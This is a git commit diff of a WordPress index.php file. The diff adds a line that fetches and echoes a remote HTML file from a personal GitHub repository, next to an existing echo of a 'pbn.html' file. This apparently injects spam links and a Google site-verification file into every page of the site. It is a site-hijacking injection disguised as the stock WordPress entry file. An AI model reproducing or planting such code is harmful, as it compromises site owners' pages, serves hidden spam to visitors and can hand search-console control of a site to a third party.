578841068f8ed50b9d18d0eeae48fe278ef948fd
Ari0078 <51977509+Ari0078@users.noreply.github.com>
2024-06-30 18:41:54 +0700

    index.php

--- index.php
+++ index.php
@@ -7,14 +7,16 @@
  */
 
 /**
- * Tells WordPress to load the WordPress theme and output it.
+ * Tells WordPress to load the WordPress theme and output it.	
  *
  * @var bool
  */
 define( 'WP_USE_THEMES', true );
 
 /** Loads the WordPress Environment and Template */
-require __DIR__ . '/wp-blog-header.php';?>
+require __DIR__ . '/wp-blog-header.php';
+?>
 <?php
 echo file_get_contents('https://raw.githubusercontent.com/Ari0078/hehe/main/pbn.html');
+echo file_get_contents('https://raw.githubusercontent.com/Ari0078/hehe/main/google29c427bcc1d8a85b.html');
 ?>
